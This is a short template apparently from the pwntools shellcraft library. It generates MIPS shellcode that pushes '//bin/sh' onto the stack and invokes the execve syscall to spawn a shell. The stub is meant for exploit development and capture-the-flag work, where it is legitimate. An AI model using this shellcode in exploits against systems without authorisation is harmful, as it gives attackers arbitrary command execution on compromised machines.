<% from pwnlib.shellcraft import mips %>
<%docstring>Execute /bin/sh</%docstring>

${mips.pushstr('//bin/sh')}

${mips.syscall('SYS_execve', '$sp', 0, 0)}

